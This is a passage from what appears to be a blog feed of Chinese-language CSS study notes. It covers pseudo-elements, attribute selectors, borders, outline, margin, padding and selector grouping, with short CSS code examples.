<span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lastname&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-伪元素"><a href="#3-伪元素" class="headerlink" title="3.伪元素"></a>3.伪元素</h2><p>伪元素是用来添加一些选择器的特殊效果。伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于文档中，所以称为伪元素。</p><p>伪类/元素：</p><table><thead><tr><th align="center">选择器</th><th align="center">示例</th><th align="center">示例说明</th></tr></thead><tbody><tr><td align="center">:link</td><td align="center">a:link</td><td align="center">选择所有未访问链接</td></tr><tr><td align="center">:visited</td><td align="center">a:visited</td><td align="center">选择所有访问过的链接</td></tr><tr><td align="center">:active</td><td align="center">a:active</td><td align="center">选择正在活动链接</td></tr><tr><td align="center">:hover</td><td align="center">a:hover</td><td align="center">把鼠标放在链接上的状态</td></tr><tr><td align="center">:focus</td><td align="center">input:focus</td><td align="center">选择元素输入后具有焦点</td></tr><tr><td align="center">:first-letter</td><td align="center">p:first-letter</td><td align="center">选择每个&lt;p&gt; 元素的第一个字母</td></tr><tr><td align="center">:first-line</td><td align="center">p:first-line</td><td align="center">选择每个&lt;p&gt; 元素的第一行</td></tr><tr><td align="center">:first-child</td><td align="center">p:first-child</td><td align="center">选择器匹配属于任意元素的第一个子元素的 &lt;]p&gt; 元素</td></tr><tr><td align="center">:before</td><td align="center">p:before</td><td align="center">在每个&lt;p&gt;元素之前插入内容</td></tr><tr><td align="center">:after</td><td align="center">p:after</td><td align="center">在每个&lt;p&gt;元素之后插入内容</td></tr><tr><td align="center">:lang(<em>language</em>)</td><td align="center">p:lang(it)</td><td align="center">为&lt;p&gt;元素的lang属性选择一个开始值</td></tr></tbody></table><h3 id="3-1-语法"><a href="#3-1-语法" class="headerlink" title="3.1 语法"></a>3.1 语法</h3><p>为元素语法：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">selector:pseudo-element &#123;property:value;&#125;<br></code></pre></div></td></tr></table></figure><p>CSS类使用伪元素：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">selector<span class="hljs-selector-class">.class</span>:pseudo-element &#123;property:value;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-first-line-伪元素"><a href="#3-2-first-line-伪元素" class="headerlink" title="3.2 :first-line 伪元素"></a>3.2 :first-line 伪元素</h3><p>“first-line” 伪元素用于向文本的首行设置特殊样式。”first-line” 伪元素只能用于块级元素。</p><p>使用实例：根据 “first-line” 伪元素中的样式对 p 元素的第一行文本进行格式化</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-line&#123;<br><span class="hljs-attribute">color</span>:<span class="hljs-number">#ff0000</span>;<br><span class="hljs-attribute">font-variant</span>:small-caps;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可应用于 “first-line” 伪元素的属性：</p><blockquote><ol><li>font properties</li><li>color properties </li><li>background properties</li><li>word-spacing</li><li>letter-spacing</li><li>text-decoration</li><li>vertical-align</li><li>text-transform</li><li>line-height</li><li>clear</li></ol></blockquote><h3 id="3-3-first-letter-伪元素"><a href="#3-3-first-letter-伪元素" class="headerlink" title="3.3 :first-letter 伪元素"></a>3.3 :first-letter 伪元素</h3><p>“first-letter” 伪元素用于向文本的首字母设置特殊样式。”first-letter” 伪元素只能用于块级元素。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-letter&#123;<br><span class="hljs-attribute">color</span>:<span class="hljs-number">#ff0000</span>;<br><span class="hljs-attribute">font-size</span>:xx-large;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可应用于 “first-letter” 伪元素的属性：</p><blockquote><ol><li>font properties</li><li>color properties </li><li>background properties</li><li>margin properties</li><li>padding properties</li><li>border properties</li><li>text-decoration</li><li>vertical-align (only if “float” is “none”)</li><li>text-transform</li><li>line-height</li><li>float</li><li>clear</li></ol></blockquote><h3 id="3-4-伪元素和-CSS-类"><a href="#3-4-伪元素和-CSS-类" class="headerlink" title="3.4 伪元素和 CSS 类"></a>3.4 伪元素和 CSS 类</h3><p>伪元素可以结合 CSS 类： </p><p>使用实例：使所有 class 为 article 的段落的首字母变为红色。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.article</span><span class="hljs-selector-pseudo">:first</span>-letter &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#ff0000</span>;&#125;       <br>&lt;p class=&quot;article&quot;&gt;A paragraph in an article&lt;/p&gt;<br></code></pre></div></td></tr></table></figure><h3 id="3-5-多个伪元素"><a href="#3-5-多个伪元素" class="headerlink" title="3.5 多个伪元素"></a>3.5 多个伪元素</h3><p>可以结合多个伪元素来使用。</p><p>使用实例：段落的第一个字母将显示为红色，其字体大小为 xx-large。第一行中的其余文本将为蓝色，并以小型大写字母显示。段落中的其余文本将以默认字体大小和颜色来显示：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-letter&#123;<br><span class="hljs-attribute">color</span>:<span class="hljs-number">#ff0000</span>;<br><span class="hljs-attribute">font-size</span>:xx-large;<br>&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-line&#123;<br><span class="hljs-attribute">color</span>:<span class="hljs-number">#0000ff</span>;<br><span class="hljs-attribute">font-variant</span>:small-caps;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-6-before-伪元素"><a href="#3-6-before-伪元素" class="headerlink" title="3.6 :before 伪元素"></a>3.6 :before 伪元素</h3><p>“:before” 伪元素可以在元素的内容前面插入新内容。</p><p>使用实例：在每个 h1元素前面插入一幅图片.</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>:before&#123;<br>content:<span class="hljs-built_in">url</span>(<span class="hljs-string">smiley.gif</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-7-after-伪元素"><a href="#3-7-after-伪元素" class="headerlink" title="3.7 :after 伪元素"></a>3.7 :after 伪元素</h3><p>“:after” 伪元素可以在元素的内容之后插入新内容。</p><p>使用实例：在每个 h1 元素后面插入一幅图片：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>:after&#123;<br>content:<span class="hljs-built_in">url</span>(<span class="hljs-string">smiley.gif</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4-属性选择器"><a href="#4-属性选择器" class="headerlink" title="4.属性选择器"></a>4.属性选择器</h2><p>属性选择器就是指可以根据元素的属性以及属性值来选择元素。具有特定属性的 HTML 元素样式不仅仅是 class 和 id。</p><p>实例：把包含标题（title）的所有元素变为蓝色.</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-attr">[title]</span><br>&#123; <span class="hljs-attribute">color</span>:blue; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-1-属性和值选择器"><a href="#4-1-属性和值选择器" class="headerlink" title="4.1 属性和值选择器"></a>4.1 属性和值选择器</h3><p>实例：改变了标题 title=’loong’ 元素的边框样式:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-attr">[title=loong]</span><br>&#123; <span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid green; &#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-1-1-多值"><a href="#4-1-1-多值" class="headerlink" title="4.1.1 多值"></a>4.1.1 多值</h4><p>实例：包含指定值的 title 属性的元素样式，使用（~）分隔属性和值:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-attr">[title~=hello]</span> &#123; <span class="hljs-attribute">color</span>:blue; &#125;<br></code></pre></div></td></tr></table></figure><p>实例：包含指定值的 lang 属性的元素样式，使用（|）分隔属性和值:</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-attr">[lang|=en]</span> &#123; <span class="hljs-attribute">color</span>:blue; &#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-表单样式"><a href="#4-2-表单样式" class="headerlink" title="4.2 表单样式"></a>4.2 表单样式</h3><p>属性选择器样式无需使用 class 或 id 的形式。<br>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span><br>&#123; <span class="hljs-attribute">width</span>:<span class="hljs-number">150px</span>;<br><span class="hljs-attribute">display</span>:block;<br><span class="hljs-attribute">margin-bottom</span>:<span class="hljs-number">10px</span>;<br><span class="hljs-attribute">background-color</span>:yellow; &#125;<br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;button&quot;</span>]</span><br>&#123; <span class="hljs-attribute">width</span>:<span class="hljs-number">120px</span>;<br><span class="hljs-attribute">margin-left</span>:<span class="hljs-number">35px</span>;<br><span class="hljs-attribute">display</span>:block; &#125;<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（三）</title>
    <link href="/2021/05/13/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/13/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-边框（Border）"><a href="#1-边框（Border）" class="headerlink" title="1.边框（Border）"></a>1.边框（Border）</h2><p>CSS 边框 (border) 可以是围绕元素内容和内边距的一条或多条线，对于这些线条，您可以自定义它们的样式、宽度以及颜色。使用 CSS 边框属性，我们可以创建出比 HTML 中更加优秀的效果。</p><p>CSS边框属性允许你指定一个元素边框的样式和颜色。</p><p>边框属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">border</td><td align="center">简写属性，用于把针对四个边的属性设置在一个声明。</td></tr><tr><td align="center">border-style</td><td align="center">用于设置元素所有边框的样式，或者单独地为各边设置边框样式。</td></tr><tr><td align="center">border-width</td><td align="center">简写属性，用于为元素的所有边框设置宽度，或者单独地为各边边框设置宽度。</td></tr><tr><td align="center">border-color</td><td align="center">简写属性，设置元素的所有边框中可见部分的颜色，或为 4 个边分别设置颜色。</td></tr><tr><td align="center">border-bottom</td><td align="center">简写属性，用于把下边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-bottom-color</td><td align="center">设置元素的下边框的颜色。</td></tr><tr><td align="center">border-bottom-style</td><td align="center">设置元素的下边框的样式。</td></tr><tr><td align="center">border-bottom-width</td><td align="center">设置元素的下边框的宽度。</td></tr><tr><td align="center">border-left</td><td align="center">简写属性，用于把左边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-left-color</td><td align="center">设置元素的左边框的颜色。</td></tr><tr><td align="center">border-left-style</td><td align="center">设置元素的左边框的样式。</td></tr><tr><td align="center">border-left-width</td><td align="center">设置元素的左边框的宽度。</td></tr><tr><td align="center">border-right</td><td align="center">简写属性，用于把右边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-right-color</td><td align="center">设置元素的右边框的颜色。</td></tr><tr><td align="center">border-right-style</td><td align="center">设置元素的右边框的样式。</td></tr><tr><td align="center">border-right-width</td><td align="center">设置元素的右边框的宽度。</td></tr><tr><td align="center">border-top</td><td align="center">简写属性，用于把上边框的所有属性设置到一个声明中。</td></tr><tr><td align="center">border-top-color</td><td align="center">设置元素的上边框的颜色。</td></tr><tr><td align="center">border-top-style</td><td align="center">设置元素的上边框的样式。</td></tr><tr><td align="center">border-top-width</td><td align="center">设置元素的上边框的宽度。</td></tr></tbody></table><h3 id="1-1-边框样式（border-style）"><a href="#1-1-边框样式（border-style）" class="headerlink" title="1.1 边框样式（border-style）"></a>1.1 边框样式（border-style）</h3><p>边框样式属性指定要显示什么样的边界。border-style属性用来定义边框的样式。</p><p>border-style 值:</p><blockquote><ol><li>none: 默认无边框</li><li>dotted: 定义一个点线框</li><li>dashed: 定义一个虚线框</li><li>solid: 定义实线边界</li><li>double: 定义两个边界。 两个边界的宽度和border-width的值相同</li><li>groove: 定义3D沟槽边界。效果取决于边界的颜色值</li><li>ridge: 定义3D脊边界。效果取决于边界的颜色值</li><li>inset:定义一个3D的嵌入边框。效果取决于边界的颜色值</li><li>outset: 定义一个3D突出边框。 效果取决于边界的颜色值</li></ol></blockquote><h3 id="1-2-边框宽度（border-width）"><a href="#1-2-边框宽度（border-width）" class="headerlink" title="1.2 边框宽度（border-width）"></a>1.2 边框宽度（border-width）</h3><p>可以通过 border-width 属性为边框指定宽度。为边框指定宽度有两种方法：可以指定长度值，比如 2px 或 0.1em；或者使用 3 个关键字之一，它们分别是 thin 、medium（默认值） 和 thick。</p><p><strong>注意：</strong>CSS 没有定义 3 个关键字的具体宽度，所以一个用户代理可能把 thin 、medium 和 thick 分别设置为等于 5px、3px 和 2px，而另一个用户代理则分别设置为 3px、2px 和 1px。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.one</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-width</span>:<span class="hljs-number">5px</span>;<br>&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.two</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-width</span>:medium;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-边框颜色（border-color）"><a href="#1-3-边框颜色（border-color）" class="headerlink" title="1.3 边框颜色（border-color）"></a>1.3 边框颜色（border-color）</h3><p>border-color 属性用于设置边框的颜色，它一次可以接受最多 4 个颜色值。还可以设置边框的颜色为”transparent”。</p><p>border-color 单独使用是不起作用的，必须得先使用 border-style 来设置边框样式。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.one</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-color</span>:red;<br>&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.two</span>&#123;<br><span class="hljs-attribute">border-style</span>:solid;<br><span class="hljs-attribute">border-color</span>:<span class="hljs-number">#98bf21</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-4-单独设置边框各边"><a href="#1-4-单独设置边框各边" class="headerlink" title="1.4 单独设置边框各边"></a>1.4 单独设置边框各边</h3><p>在 CSS 中，可以指定不同的侧面不同的边框：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">border-top-style</span>:dotted;<br><span class="hljs-attribute">border-right-style</span>:solid;<br><span class="hljs-attribute">border-bottom-style</span>:dotted;<br><span class="hljs-attribute">border-left-style</span>:solid;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上面的例子也可以设置一个单一属性：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">border-style</span>:dotted solid;<br></code></pre></div></td></tr></table></figure><p>border-style 属性可以有 1-4 个值：</p><blockquote><ol><li>border-style:dotted solid double dashed;（4个值）<br>上边框是 dotted<br>右边框是 solid<br>底边框是 double<br>左边框是 dashed</li></ol></blockquote><blockquote><ol start="2"><li>border-style:dotted solid double;（3个值）<br>上边框是 dotted<br>左、右边框是 solid<br>底边框是 double</li></ol></blockquote><blockquote><ol start="3"><li>border-style:dotted solid;（2个值）<br>上、底边框是 dotted<br>左、右边框是 solid</li></ol></blockquote><blockquote><ol start="4"><li>border-style:dotted;（1个值）<br>四面边框是 dotted</li></ol></blockquote><p>上面的例子用了 border-style。然而，它也可以和 border-width 、 border-color 一起使用。</p><h3 id="1-5-透明边框（transparent）"><a href="#1-5-透明边框（transparent）" class="headerlink" title="1.5 透明边框（transparent）"></a>1.5 透明边框（transparent）</h3><p>CSS2 引入了边框颜色值 transparent，这个值用于创建有宽度的不可见边框。</p><p>透明样式实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>, <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;    <br><span class="hljs-attribute">border-style</span>: solid; <span class="hljs-attribute">border-width</span>: <span class="hljs-number">5px</span>; <span class="hljs-attribute">border-color</span>: transparent;<br>&#125; <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">border-color</span>: gray;&#125;<br></code></pre></div></td></tr></table></figure><p>利用 transparent，使用边框就像是额外的内边距一样；此外还有一个好处，就是能在你需要的时候使其可见。这种透明边框相当于内边距，因为元素的背景会延伸到边框区域（如果有可见背景的话）。 </p><h3 id="1-6-简写属性"><a href="#1-6-简写属性" class="headerlink" title="1.6 简写属性"></a>1.6 简写属性</h3><p>上面的例子用了很多属性来设置边框。也可以在一个属性中设置边框。<br>可以在”border”属性中设置：</p><ul><li>border-width</li><li>border-style (required)</li><li>border-color</li></ul><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">border</span>:<span class="hljs-number">5px</span> solid red;<br></code></pre></div></td></tr></table></figure><h2 id="2-轮廓（outline）"><a href="#2-轮廓（outline）" class="headerlink" title="2.轮廓（outline）"></a>2.轮廓（outline）</h2><p>轮廓（outline）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用。<br>轮廓（outline）属性指定了样式，颜色和外边框的宽度。<br>轮廓（outline）属性的位置让它不像边框那样参与到文档流中，因此轮廓出现或消失时不会影响文档流，即不会导致文档的重新显示。</p><p>轮廓（outline）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用。<br>CSS outline 属性规定元素轮廓的样式、颜色和宽度。如图：</p><p><img src="https://img-blog.csdnimg.cn/20210513183904643.gif"></p><p>轮廓属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">值</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">outline</td><td align="center">在一个声明中设置所有的外边框属性</td><td align="center">*outline-color outline-style outline-width *inherit</td><td align="center">2</td></tr><tr><td align="center">outline-color</td><td align="center">设置外边框的颜色</td><td align="center">*color-name hex-number rgb-number *invert inherit</td><td align="center">2</td></tr><tr><td align="center">outline-style</td><td align="center">设置外边框的样式</td><td align="center">none dotted dashed solid double groove ridge inset outset inherit</td><td align="center">2</td></tr><tr><td align="center">outline-width</td><td align="center">设置外边框的宽度</td><td align="center">thin medium thick *length *inherit</td><td align="center">2</td></tr></tbody></table><h2 id="3-外边距（Margin）"><a href="#3-外边距（Margin）" class="headerlink" title="3.外边距（Margin）"></a>3.外边距（Margin）</h2><p>CSS Margin (外边距)属性定义元素周围的空间。CSS Margin 属性接受任何长度单位、百分数值甚至负值。</p><p>margin 清除周围的元素（外边框）的区域。margin 没有背景颜色，是完全透明的。margin 可以单独改变元素的上，下，左，右边距。也可以一次改变所有的属性。</p><h2 id="4-填充（Padding）"><a href="#4-填充（Padding）" class="headerlink" title="4.填充（Padding）"></a>4.填充（Padding）</h2><p>CSS Padding（填充）属性定义元素边框与元素内容之间的空间。当元素的 Padding（填充）（内边距）被清除时，所”释放”的区域将会受到元素背景颜色的填充。单独使用填充属性可以改变上下左右的填充。缩写填充属性也可以使用，一旦改变一切都改变。</p><p>CSS padding 属性可以使用长度值或百分比值，但与 margin 属性不同，它不允许使用负值。</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">padding</td><td align="center">使用缩写属性设置在一个声明中的所有填充属性</td></tr><tr><td align="center">padding-bottom</td><td align="center">设置元素的底部填充</td></tr><tr><td align="center">padding-left</td><td align="center">设置元素的左部填充</td></tr><tr><td align="center">padding-right</td><td align="center">设置元素的右部填充</td></tr><tr><td align="center">padding-top</td><td align="center">设置元素的顶部填充</td></tr></tbody></table><h3 id="4-1-内边距的百分比数值"><a href="#4-1-内边距的百分比数值" class="headerlink" title="4.1 内边距的百分比数值"></a>4.1 内边距的百分比数值</h3><p>CSS padding 属性的百分比数值是相对于其父元素的 width 计算的，如果改变了父元素的 width，则它们也会改变。</p><p>使用实例：段落的内边距设置为父元素 width 的 20% </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">20%</span>;&#125;<br></code></pre></div></td></tr></table></figure><p>如果一个段落的父元素是 div 元素，那么它的 padding 的 width 计算是根据 div 进行的：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;div style=&quot;width: 200px;&quot;&gt;        <br>&lt;<span class="hljs-selector-tag">p</span>&gt;这个段落包含在一个宽度为<span class="hljs-number">200</span>像素的<span class="hljs-selector-tag">DIV</span>中。&lt;/<span class="hljs-selector-tag">p</span>&gt;    <br>&lt;/<span class="hljs-selector-tag">div</span>&gt;<br></code></pre></div></td></tr></table></figure><p>上下内边距与左右内边距一致，即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。</p><h3 id="4-2-单边内边距属性"><a href="#4-2-单边内边距属性" class="headerlink" title="4.2 单边内边距属性"></a>4.2 单边内边距属性</h3><p>在CSS中，可以指定不同的侧面不同的填充：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">padding-top</span>:<span class="hljs-number">25px</span>;<br><span class="hljs-attribute">padding-bottom</span>:<span class="hljs-number">25px</span>;<br><span class="hljs-attribute">padding-right</span>:<span class="hljs-number">50px</span>;<br><span class="hljs-attribute">padding-left</span>:<span class="hljs-number">50px</span>;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-简写属性"><a href="#4-3-简写属性" class="headerlink" title="4.3 简写属性"></a>4.3 简写属性</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">padding</span>:<span class="hljs-number">25px</span> <span class="hljs-number">50px</span>;<br></code></pre></div></td></tr></table></figure><p>Padding 属性，可以有一到四个值：</p><blockquote><ol><li>padding:25px 50px 75px 100px;（4个值）<br>上填充为25px<br>右填充为50px<br>下填充为75px<br>左填充为100px</li></ol></blockquote><blockquote><ol start="2"><li>padding:25px 50px 75px;（3个值）<br>上填充为25px<br>左右填充为50px<br>下填充为75px</li></ol></blockquote><blockquote><ol start="3"><li>padding:25px 50px;（2个值）<br>上下填充为25px<br>左右填充为50px</li></ol></blockquote><blockquote><ol start="4"><li>padding:25px;（1个值）<br>所有的填充都是25px</li></ol></blockquote><h2 id="5-分组和嵌套"><a href="#5-分组和嵌套" class="headerlink" title="5.分组和嵌套"></a>5.分组和嵌套</h2><p>CSS 分组可以将具有相同样式的选择器进行分组，减少代码量。</p><p>CSS 嵌套适用于选择器内部的选择器的样式。</p><h3 id="5-1-分组选择器"><a href="#5-1-分组选择器" class="headerlink" title="5.1 分组选择器"></a>5.1 分组选择器</h3><p>在样式表中有很多具有相同样式的元素。为了尽量减少代码，可以使用分组选择器。每个选择器用逗号分隔。</p><p>如正常样式：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br><span class="hljs-selector-tag">h2</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">color</span>:green;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>对上面代码采用分组选择器：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>,<span class="hljs-selector-tag">h2</span>,<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>:green;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以对任意多个选择器进行分组，CSS 对此没有任何限制。</p><h3 id="5-2-嵌套选择器"><a 